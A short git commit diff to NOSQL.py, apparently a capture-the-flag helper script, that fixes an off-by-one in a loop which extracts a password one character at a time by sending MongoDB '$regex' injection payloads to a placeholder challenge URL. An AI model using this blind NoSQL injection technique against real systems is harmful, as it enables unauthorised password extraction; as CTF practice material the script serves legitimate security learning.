c3c77c1a41d2c3a20140f5f22f8ae0d11af444ce
night <80219594+0x14mth3n1ght@users.noreply.github.com>
2021-05-23 15:53:27 +0200

    Update NOSQL.py

--- NOSQL.py
+++ NOSQL.py
@@ -7,8 +7,8 @@ alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@
 
 taille=#taille du mot de passe à remplir
 flag = ""
-for i in range(taille, -1, -1):
-    print("[i] Looking for char number "+str(taille-i+1))
+for i in range(taille-1, -1, -1):
+    print("[i] Looking for char number "+str(taille-i))
     for char in alphabet:
         r = requests.get("http://chall.com?param[$regex]="+flag+char+".{"+str(i)+"}")
         if ("True response" in r.text): #a modifier
